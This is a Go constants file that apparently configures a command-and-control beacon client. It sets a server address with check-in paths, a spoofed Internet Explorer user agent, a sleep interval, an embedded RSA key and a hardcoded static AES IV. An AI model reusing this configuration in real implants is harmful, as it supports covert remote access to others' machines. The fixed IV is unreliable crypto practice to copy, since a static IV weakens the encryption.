package constants

import (
	"time"
)

var (
	// Be wary of extra white space
	RsaPublicKey = []byte(`-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCE893xXrVJ7lvUIZyQzBABA4NDGLHKvgfkZ5Ko
Hp2hBOQemvhbkhiYIM46y2VGiShbkO6KgYkP9oMs/efIKvrbpBdv1qW4PIaHxNEvYz5T5IaYxt7x
J6JqDBl5e3S7KOhvci76QtWfR/TrNyU9tv8Wz8wqe9kovpHNpVzUNJvVUQIDAQAB
-----END PUBLIC KEY-----`)

	Url                         = "172.16.1.2:4443"
	PlainHTTP                   = "http://"
	SslHTTP                     = "https://"
	GetUri                      = "/geturi"
	PostUri                     = "/posturi"
	GetUrl                      = SslHTTP + Url + GetUri
	PostUrl                     = SslHTTP + Url + PostUri
	UserAgent                   = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)"
	UseProxy                    = false
	Proxy                       = "127.0.0.1:8080"
	SleepTime                   = 10000 * time.Millisecond
	VerifySSLCert               = true
	TimeOut       time.Duration = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
)

const (
	DebugMode = false
)
